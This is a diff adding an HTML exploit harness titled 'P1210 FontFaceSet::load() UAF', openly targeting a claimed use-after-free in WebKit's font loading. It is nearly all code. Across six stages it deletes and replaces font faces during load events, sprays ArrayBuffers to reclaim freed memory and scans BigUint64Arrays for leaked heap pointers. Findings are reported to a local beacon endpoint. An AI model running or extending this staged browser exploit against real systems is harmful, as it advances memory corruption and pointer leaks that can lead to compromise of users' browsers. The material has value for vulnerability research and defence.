@@ -1,0 +1,490 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1210 FontFaceSet::load() UAF</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:50vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1210 — FONTFACESET::LOAD() UAF TRIGGER</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">...</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var c=FD.textContent;FD.textContent=(c==='no findings yet'?'':c+'\n')+t;}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1210-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1210: FontFaceSet::load() UAF — CVE-2026-43715 variant
+
+   THEORY: WebKit's FontFaceSet::load() calls matchingFacesForFamily()
+   which iterates internal CSSFontFace objects. If we can trigger GC or
+   remove faces from the set during this iteration (via a loading event
+   listener or promise microtask), the iteration holds a stale pointer.
+
+   Unlike the .then getter UAF (which leaks heap ptrs), this targets the
+   LOAD PATH where Ref<> protects iterateClients() but not load().
+
+   APPROACH:
+   Stage 0: Feature detect — document.fonts API, FontFace constructor
+   Stage 1: Load-and-delete — call load(), in the loading event delete
+            the FontFace objects from the set
+   Stage 2: Load-and-replace — during loading event, delete old faces
+            and add new ones (same-type reclaim within IsoHeap zone)
+   Stage 3: Promise microtask deletion — FontFace.load() returns a
+            promise; in the microtask, remove the face from the set
+   Stage 4: Rapid cycle — 50 iterations of add-load-delete with
+            ArrayBuffer spray for reclaim detection
+   Stage 5: BigUint64Array read — if reclaim works, read raw 64-bit
+            pointers through confused type
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var STAGES=['detect','loadDelete','loadReplace','promiseMicro','rapidCycle','bigintRead'];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1210_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1210_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/'+STAGES.length+' — '+(STAGES[stage]||'DONE'));
+
+function done(rep){
+  results.push({stage:stage,name:STAGES[stage],result:rep});
+  try{localStorage.setItem('p1210_res',JSON.stringify(results));}catch(e){}
+  B('RESULT','s'+stage+'|'+rep.slice(0,700));
+  addFind('S'+stage+' '+STAGES[stage]+': '+rep.slice(0,200));
+  setStatus(rep.slice(0,80));
+  log('=== S'+stage+' -> '+rep+' ===','ok');
+  setTimeout(function(){location.reload();},1500);
+}
+
+function makeFontSrc(id){
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var ctx=canvas.getContext('2d');
+  ctx.fillStyle='#'+(0x100000+id).toString(16).slice(1);
+  ctx.fillRect(0,0,1,1);
+  return canvas.toDataURL('image/png');
+}
+
+function makeDataFont(family,id){
+  var minWoff2='d09GMgABAAAAAADcAAoAAAAAARAAAACPAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAABmAARABEAEQARABEAAAACwAA'+
+  'AJAAeAE2AiQDCAsGAAQgBSAHIBuHARHlGgBgSQABNgIkAwgLBgAEIAUgByAbhwER5RoAYEkAAQAAAAAAAAAAAA==';
+  try{
+    return new FontFace(family,'url(data:font/woff2;base64,'+minWoff2+')',{weight:'400',style:'normal'});
+  }catch(e){
+    return new FontFace(family,'local(sans-serif)',{weight:'400',style:'normal'});
+  }
+}
+
+if(stage>=STAGES.length){
+  setStatus('ALL STAGES COMPLETE');
+  var summary=JSON.stringify(results);
+  B('ALL-DONE',summary.slice(0,800));
+  log('ALL DONE','ok');
+  log(summary,'info');
+  try{localStorage.removeItem('p1210_stage');localStorage.removeItem('p1210_res');}catch(e){}
+}else{
+
+try{localStorage.setItem('p1210_stage',''+(stage+1));}catch(e){}
+var cur=STAGES[stage];
+setPhase(cur);
+
+/* ─── STAGE 0: Feature detect ─── */
+if(stage===0)(function(){
+  log('S0: Feature detect','info');
+  var checks={};
+
+  checks.documentFonts=typeof document.fonts!=='undefined';
+  checks.FontFace=typeof FontFace==='function';
+  checks.fontsAdd=checks.documentFonts&&typeof document.fonts.add==='function';
+  checks.fontsDelete=checks.documentFonts&&typeof document.fonts.delete==='function';
+  checks.fontsLoad=checks.documentFonts&&typeof document.fonts.load==='function';
+  checks.fontsClear=checks.documentFonts&&typeof document.fonts.clear==='function';
+  checks.fontsForEach=checks.documentFonts&&typeof document.fonts.forEach==='function';
+  checks.fontsSize=checks.documentFonts?document.fonts.size:-1;
+
+  if(checks.FontFace){
+    try{
+      var f=new FontFace('test1210','local(sans-serif)');
+      checks.faceStatus=f.status;
+      checks.faceLoad=typeof f.load==='function';
+      checks.faceLoaded=typeof f.loaded;
+      checks.faceFamily=f.family;
+    }catch(e){checks.faceError=e.message;}
+  }
+
+  if(checks.fontsAdd){
+    try{
+      var f2=new FontFace('test1210add','local(sans-serif)');
+      document.fonts.add(f2);
+      checks.addedSize=document.fonts.size;
+      var deleted=document.fonts.delete(f2);
+      checks.deleteResult=deleted;
+      checks.afterDelSize=document.fonts.size;
+    }catch(e){checks.addDelError=e.message;}
+  }
+
+  checks.WeakRef=typeof WeakRef==='function';
+  checks.FinalizationRegistry=typeof FinalizationRegistry==='function';
+  checks.BigUint64Array=typeof BigUint64Array==='function';
+  checks.RAB=typeof ArrayBuffer.prototype.resize==='function';
+
+  var rep=JSON.stringify(checks);
+  log('features: '+rep,'ok');
+  done('FEATURES|'+rep);
+})();
+
+/* ─── STAGE 1: Load-and-delete ─── */
+else if(stage===1)(function(){
+  log('S1: load-and-delete during FontFaceSet.load()','info');
+  setCounters('creating faces, calling load, deleting in event...');
+
+  var N=20;
+  var faces=[];
+  var events=[];
+  var crashed=false;
+  var loadResult=null;
+
+  for(var i=0;i<N;i++){
+    var f=new FontFace('fam1210s1_'+i,'local(sans-serif)');
+    faces.push(f);
+    document.fonts.add(f);
+  }
+  log('added '+N+' faces, set size='+document.fonts.size,'info');
+
+  document.fonts.addEventListener('loading',function(){
+    events.push('loading');
+    log('EVENT: loading — deleting all faces NOW','warn');
+    for(var j=0;j<faces.length;j++){
+      try{document.fonts.delete(faces[j]);}catch(e){events.push('delErr:'+e.message);}
+    }
+    log('deleted all, set size='+document.fonts.size,'warn');
+    events.push('deleted-all-size='+document.fonts.size);
+  });
+
+  document.fonts.addEventListener('loadingdone',function(){
+    events.push('loadingdone-size='+document.fonts.size);
+    log('EVENT: loadingdone, size='+document.fonts.size,'ok');
+  });
+
+  document.fonts.addEventListener('loadingerror',function(){
+    events.push('loadingerror');
+    log('EVENT: loadingerror','err');
+  });
+
+  try{
+    var p=document.fonts.load('16px fam1210s1_0');
+    if(p&&typeof p.then==='function'){
+      p.then(function(loaded){
+        loadResult='resolved:'+((loaded&&loaded.length)||0);
+        events.push(loadResult);
+        log('load() resolved: '+JSON.stringify(loaded&&loaded.length),'ok');
+        finish();
+      }).catch(function(e){
+        loadResult='rejected:'+e.message;
+        events.push(loadResult);
+        log('load() rejected: '+e.message,'err');
+        finish();
+      });
+    }else{
+      events.push('load-sync:'+p);
+      finish();
+    }
+  }catch(e){
+    events.push('load-threw:'+e.message);
+    log('load() threw: '+e.message,'err');
+    finish();
+  }
+
+  function finish(){
+    var rep='events=['+events.join(',')+']|crashed='+crashed;
+    log('S1 result: '+rep,'info');
+    done('LOAD-DELETE|'+rep);
+  }
+
+  setTimeout(function(){
+    if(!loadResult){
+      events.push('TIMEOUT');
+      finish();
+    }
+  },8000);
+})();
+
+/* ─── STAGE 2: Load-and-replace (same-type reclaim) ─── */
+else if(stage===2)(function(){
+  log('S2: load-and-replace — delete old faces, add new ones during load','info');
+
+  var N=20;
+  var oldFaces=[],newFaces=[];
+  var events=[];
+
+  for(var i=0;i<N;i++){
+    var f=new FontFace('fam1210s2_'+i,'local(sans-serif)');
+    oldFaces.push(f);
+    document.fonts.add(f);
+  }
+
+  for(var i=0;i<N;i++){
+    newFaces.push(new FontFace('fam1210s2r_'+i,'local(sans-serif)'));
+  }
+
+  document.fonts.addEventListener('loading',function handler(){
+    events.push('loading');
+    log('EVENT: loading — replacing faces NOW','warn');
+    for(var j=0;j<oldFaces.length;j++){
+      try{document.fonts.delete(oldFaces[j]);}catch(e){}
+    }
+    for(var j=0;j<newFaces.length;j++){
+      try{document.fonts.add(newFaces[j]);}catch(e){}
+    }
+    events.push('replaced-size='+document.fonts.size);
+    log('replaced all, set size='+document.fonts.size,'warn');
+  });
+
+  document.fonts.addEventListener('loadingdone',function(){
+    events.push('loadingdone-size='+document.fonts.size);
+  });
+
+  try{
+    document.fonts.load('16px fam1210s2_0').then(function(r){
+      events.push('resolved:'+((r&&r.length)||0));
+      finish();
+    }).catch(function(e){
+      events.push('rejected:'+e.message);
+      finish();
+    });
+  }catch(e){
+    events.push('threw:'+e.message);
+    finish();
+  }
+
+  function finish(){
+    done('LOAD-REPLACE|events=['+events.join(',')+']');
+  }
+  setTimeout(function(){events.push('TIMEOUT');finish();},8000);
+})();
+
+/* ─── STAGE 3: Promise microtask deletion ─── */
+else if(stage===3)(function(){
+  log('S3: promise microtask — delete face in load() promise resolution','info');
+
+  var events=[];
+  var face=new FontFace('fam1210s3','local(sans-serif)');
+  document.fonts.add(face);
+
+  var weakRef=null;
+  if(typeof WeakRef==='function'){
+    weakRef=new WeakRef(face);
+  }
+
+  try{
+    face.load().then(function(){
+      events.push('face-load-resolved');
+      log('face.load() resolved — deleting from set','warn');
+      document.fonts.delete(face);
+      face=null;
+      events.push('deleted-face-null');
+
+      return document.fonts.load('16px fam1210s3');
+    }).then(function(r){
+      events.push('set-load-after-delete:'+((r&&r.length)||0));
+      if(weakRef){
+        events.push('weakRef-alive:'+(weakRef.deref()!==undefined));
+      }
+      finish();
+    }).catch(function(e){
+      events.push('rejected:'+e.message);
+      finish();
+    });
+  }catch(e){
+    events.push('threw:'+e.message);
+    finish();
+  }
+
+  function finish(){
+    done('PROMISE-MICRO|events=['+events.join(',')+']');
+  }
+  setTimeout(function(){events.push('TIMEOUT');finish();},8000);
+})();
+
+/* ─── STAGE 4: Rapid cycle with ArrayBuffer spray ─── */
+else if(stage===4)(function(){
+  log('S4: rapid add-load-delete cycles with AB spray','info');
+
+  var ITERS=30;
+  var iter=0;
+  var events=[];
+  var anomalies=0;
+  var sprays=[];
+
+  function cycle(){
+    if(iter>=ITERS){
+      done('RAPID-CYCLE|iters='+ITERS+'|anomalies='+anomalies+'|events=['+events.slice(-10).join(',')+']');
+      return;
+    }
+    setCounters('cycle '+iter+'/'+ITERS+' anomalies='+anomalies);
+
+    var faces=[];
+    for(var i=0;i<10;i++){
+      var f=new FontFace('fam1210s4_'+iter+'_'+i,'local(sans-serif)');
+      faces.push(f);
+      document.fonts.add(f);
+    }
+
+    var loadDone=false;
+    document.fonts.addEventListener('loading',function handler(){
+      document.fonts.removeEventListener('loading',handler);
+      for(var j=0;j<faces.length;j++){
+        try{document.fonts.delete(faces[j]);}catch(e){}
+      }
+      for(var k=0;k<20;k++){
+        var ab=new ArrayBuffer(192);
+        var dv=new DataView(ab);
+        dv.setUint32(0,0xDEAD0000+iter,true);
+        dv.setUint32(4,0xBEEF0000+k,true);
+        sprays.push(ab);
+      }
+    },{once:true});
+
+    try{
+      document.fonts.load('16px fam1210s4_'+iter+'_0').then(function(r){
+        var len=r?r.length:0;
+        if(len>0){
+          events.push('iter'+iter+':resolved-'+len+'-UNEXPECTED');
+          anomalies++;
+          log('ANOMALY iter '+iter+': load resolved with '+len+' faces after deletion!','hit');
+          B('ANOMALY','iter='+iter+'|resolved='+len);
+        }
+        loadDone=true;
+        iter++;
+        setTimeout(cycle,50);
+      }).catch(function(e){
+        loadDone=true;
+        iter++;
+        setTimeout(cycle,50);
+      });
+    }catch(e){
+      iter++;
+      setTimeout(cycle,50);
+    }
+
+    setTimeout(function(){
+      if(!loadDone){iter++;setTimeout(cycle,50);}
+    },3000);
+  }
+  cycle();
+})();
+
+/* ─── STAGE 5: BigUint64Array pointer read ─── */
+else if(stage===5)(function(){
+  log('S5: BigUint64Array read after reclaim attempt','info');
+
+  if(typeof BigUint64Array!=='function'){
+    done('BIGINT-READ|NO-BigUint64Array');
+    return;
+  }
+
+  var ITERS=20;
+  var iter=0;
+  var ptrFinds=[];
+  var sprays=[];
+
+  function cycle(){
+    if(iter>=ITERS){
+      done('BIGINT-READ|iters='+ITERS+'|ptrs='+ptrFinds.length+'|finds=['+ptrFinds.slice(0,10).join(',')+']');
+      return;
+    }
+
+    var faces=[];
+    for(var i=0;i<5;i++){
+      var f=new FontFace('fam1210s5_'+iter+'_'+i,'local(sans-serif)');
+      faces.push(f);
+      document.fonts.add(f);
+    }
+
+    document.fonts.addEventListener('loading',function handler(){
+      document.fonts.removeEventListener('loading',handler);
+      for(var j=0;j<faces.length;j++){
+        try{document.fonts.delete(faces[j]);}catch(e){}
+      }
+      for(var k=0;k<30;k++){
+        var ab=new ArrayBuffer(192);
+        var bv=new BigUint64Array(ab);
+        for(var q=0;q<bv.length;q++){
+          bv[q]=BigInt('0xAAAAAAAAAAAAAAAA');
+        }
+        sprays.push({ab:ab,bv:bv});
+      }
+    },{once:true});
+
+    try{
+      document.fonts.load('16px fam1210s5_'+iter+'_0').then(function(r){
+        for(var s=0;s<sprays.length;s++){
+          var bv=sprays[s].bv;
+          for(var q=0;q<bv.length;q++){
+            var v=bv[q];
+            if(v!==BigInt('0xAAAAAAAAAAAAAAAA')&&v!==BigInt(0)){
+              var hex='0x'+v.toString(16);
+              ptrFinds.push('s'+s+'q'+q+'='+hex);
+              log('PTR FOUND: spray['+s+']['+q+'] = '+hex,'hit');
+              B('PTR','s'+s+'q'+q+'='+hex);
+            }
+          }
+        }
+        sprays=[];
+        iter++;
+        setTimeout(cycle,100);
+      }).catch(function(){iter++;sprays=[];setTimeout(cycle,100);});
+    }catch(e){iter++;sprays=[];setTimeout(cycle,100);}
+
+    setTimeout(function(){iter++;sprays=[];setTimeout(cycle,100);},4000);
+  }
+  cycle();
+})();
+
+} /* end else (not done) */
+
+/* ─── Reload poller ─── */
+var _rl='',_rp=0;
+function checkReload(){
+  if(_rp>300)return;_rp++;
+  var x=new XMLHttpRequest();
+  x.open('GET','/reload.txt?_='+Date.now(),true);
+  x.timeout=3000;
+  x.onload=function(){
+    var t=(x.responseText||'').trim();
+    if(_rl&&t!==_rl){log('RELOAD signal: '+t,'warn');setTimeout(function(){location.reload();},500);return;}
+    _rl=t;
+  };
+  try{x.send();}catch(e){}
+  setTimeout(checkReload,3000);
+}
+setTimeout(checkReload,2000);
+</script>
+</body></html>
